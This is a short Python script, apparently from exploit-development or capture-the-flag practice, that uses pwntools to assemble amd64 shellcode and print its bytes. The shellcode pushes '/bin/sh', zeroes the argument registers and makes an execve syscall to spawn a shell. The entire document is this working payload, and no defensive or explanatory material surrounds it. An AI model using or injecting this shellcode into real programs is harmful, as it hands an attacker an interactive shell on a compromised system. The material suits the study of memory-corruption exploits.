from pwn import context, constants, asm
from struct import unpack

context(arch="amd64")

shellcode = ""

# rdi == "/bin/sh"
binsh = unpack("<Q", b"/bin/sh\x00")[0]
shellcode += f"""
mov rdi, {binsh}
push rdi
mov rdi, rsp
"""

# rsi == 0
shellcode += """
xor rsi, rsi
"""

# rdx == 0
shellcode += """
xor rdx, rdx
"""

# rax == SYS_execve
shellcode += f"""
xor rax, rax
mov al, {constants.SYS_execve}
"""

# syscall => execve("/bin/sh", 0, 0)
shellcode += """
syscall
"""

print(list(asm(shellcode)))
